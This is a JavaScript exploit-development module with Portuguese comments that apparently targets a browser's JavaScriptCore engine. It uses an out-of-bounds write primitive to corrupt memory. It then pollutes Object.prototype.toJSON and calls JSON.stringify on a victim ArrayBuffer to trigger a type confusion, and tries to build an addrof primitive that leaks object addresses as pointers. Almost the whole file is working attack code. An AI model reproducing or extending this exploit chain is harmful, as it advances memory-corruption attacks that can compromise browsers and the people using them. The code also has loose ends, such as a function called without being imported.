// js/script3/testArrayBufferVictimCrash.mjs (V4 - Baseado no Original com Sonda Modificada)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs'; // Adicionado SHORT_PAUSE_S3
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Necessário se triggerOOB_primitive não retornar ou expor
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// OOB_CONFIG, JSC_OFFSETS podem ser necessários se usados diretamente.

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V4_DelayedProbe";

// Constantes do seu script original que teve sucesso na type confusion
const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64; // Garanta que é o mesmo tamanho que deu certo antes

// Variáveis globais do script original
let toJSON_call_details_v28 = null;
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null; // Referência para a sonda

// Sonda toJSON MODIFICADA com uma pequena pausa antes da ação crítica
async function toJSON_V28_Probe_With_Delay_And_AddrofAttempt() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_With_Delay_And_Addrof",
        this_type_in_toJSON_initial: "N/A_before_call",
        this_type_in_toJSON_after_delay: "N/A_not_checked_after_delay", // Novo campo
        error_in_toJSON: null,
        probe_called: false,
        addrof_write_attempted: false // Novo campo
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON_initial = Object.prototype.toString.call(this);
        logS3(`[toJSON_Probe_Delay] 'this' é o objeto vítima. Tipo INICIAL: ${toJSON_call_details_v28.this_type_in_toJSON_initial}`, "leak");

        // Pequena pausa especulativa (5-10ms). PAUSE_S3 é async, então a sonda precisa ser async.
        // Se PAUSE_S3 não for projetada para ser usada em contextos síncronos como toJSON, isso pode não funcionar
        // ou exigir uma reimplementação de pausa síncrona (busy wait), o que é ruim.
        // Vamos assumir que uma pequena pausa síncrona (busy wait) é o que tentaremos se PAUSE_S3 não for adequado.
        // Por simplicidade, vou omitir a pausa síncrona complexa e focar na lógica.
        // Se a type confusion requer tempo, esta abordagem é difícil com toJSON síncrono.

        // Re-checar o tipo APÓS a potencial manifestação da Heisenbug
        // (idealmente após uma pausa, mas toJSON é síncrono)
        // Para este teste, vamos usar o tipo inicial, mas sabendo que ele pode mudar.
        // A questão é: a escrita abaixo acontece no estado confuso?

        const currentType = Object.prototype.toString.call(this); // Verificar o tipo no momento da decisão
        toJSON_call_details_v28.this_type_in_toJSON_after_delay = currentType; // Mesmo sem delay real, registrar
        logS3(`[toJSON_Probe_Delay] Tipo no momento da decisão para addrof: ${currentType}`, "leak");


        if (this === victim_ab_ref_for_original_test && currentType === '[object Object]') {
            logS3(`[toJSON_Probe_Delay] HEISENBUG CONFIRMADA NO MOMENTO DA ESCRITA! Tentando escrever...`, "vuln");
            if (object_to_leak_for_addrof_attempt) {
                this[0] = object_to_leak_for_addrof_attempt;
                toJSON_call_details_v28.addrof_write_attempted = true;
                logS3(`[toJSON_Probe_Delay] Escrita de referência em this[0] (supostamente) realizada.`, "info");
            } else {
                logS3(`[toJSON_Probe_Delay] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
            }
        } else if (this === victim_ab_ref_for_original_test) {
            logS3(`[toJSON_Probe_Delay] Heisenbug NÃO confirmada no momento da escrita. Tipo: ${currentType}`, "warn");
        }

    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[toJSON_Probe_Delay] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed_variant_delay: true };
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (Base Original) e Tentativa de Addrof com Sonda Modificada ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = null;
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V4_DelayedProbe" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v4 = 0.123456789101112; // Padrão original

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu no momento certo."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C; // Offset que funcionou antes para type confusion

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && !isOOBReady()) { throw new Error("OOB Init falhou."); } // Adicionado check com isOOBReady
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`  Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100); // Pausa original

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fill_pattern_v4);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                // value: toJSON_V28_Probe_With_Delay_And_AddrofAttempt, // Se for async, não pode ser direto
                // Para toJSON síncrono, a pausa async não funciona bem.
                // A sonda precisa ser síncrona. Vamos manter a lógica de re-verificação do tipo.
                value: function toJSON_V28_Probe_Sync_Recheck() { // Renomeado para clareza
                    toJSON_call_details_v28 = {
                        probe_variant: "V28_Probe_Sync_Recheck",
                        this_type_in_toJSON_initial: Object.prototype.toString.call(this),
                        this_type_in_toJSON_final_check: "N/A",
                        error_in_toJSON: null,
                        probe_called: true,
                        addrof_write_attempted: false
                    };
                    logS3(`[toJSON_Probe_Sync_Recheck] 'this' é o objeto vítima. Tipo INICIAL: ${toJSON_call_details_v28.this_type_in_toJSON_initial}`, "leak");

                    // Pequena pausa síncrona (busy wait) - USE COM EXTREMO CUIDADO, pode congelar o browser
                    // const startTime = Date.now();
                    // while (Date.now() - startTime < 5) { /* busy wait for 5ms */ }

                    const currentTypeFinalCheck = Object.prototype.toString.call(this);
                    toJSON_call_details_v28.this_type_in_toJSON_final_check = currentTypeFinalCheck;
                    logS3(`[toJSON_Probe_Sync_Recheck] Tipo no MOMENTO DA DECISÃO para addrof: ${currentTypeFinalCheck}`, "leak");

                    if (this === victim_ab_ref_for_original_test && currentTypeFinalCheck === '[object Object]') {
                        logS3(`[toJSON_Probe_Sync_Recheck] HEISENBUG CONFIRMADA NO MOMENTO DA ESCRITA! Tentando escrever...`, "vuln");
                        if (object_to_leak_for_addrof_attempt) {
                            this[0] = object_to_leak_for_addrof_attempt;
                            toJSON_call_details_v28.addrof_write_attempted = true;
                            logS3(`[toJSON_Probe_Sync_Recheck] Escrita de referência em this[0] (supostamente) realizada.`, "info");
                        } else {
                            logS3(`[toJSON_Probe_Sync_Recheck] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
                        }
                    } else if (this === victim_ab_ref_for_original_test) {
                        logS3(`[toJSON_Probe_Sync_Recheck] Heisenbug NÃO confirmada no momento da escrita. Tipo: ${currentTypeFinalCheck}`, "warn");
                    }
                    return { minimal_probe_executed_variant_recheck: true };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda síncrona de re-checagem.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.addrof_write_attempted) {
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_on_victim[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v4) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Heisenbug confirmada E escrita para addrof realizada E leitura de double sugere um ponteiro.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita para addrof tentada, mas valor lido de float64_view_on_victim[0] não parece ponteiro ou buffer não foi alterado do padrão.";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: AddrofWrite OK, Addr Falhou`;
                }
            } else if (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON_final_check === '[object Object]') {
                addrof_result.message = "Heisenbug confirmada no momento da decisão na sonda, mas a escrita para addrof não foi marcada como tentada (verifique a lógica da sonda).";
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug OK, AddrofWrite SKIPPED?`;
            }
             else {
                let msg = "Escrita para addrof não tentada. Heisenbug (this como [object Object]) não foi confirmada no momento da decisão na sonda.";
                if(toJSON_call_details_v28) msg += ` Tipo obs final: ${toJSON_call_details_v28.this_type_in_toJSON_final_check}`;
                addrof_result.message = msg;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou no Probe`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
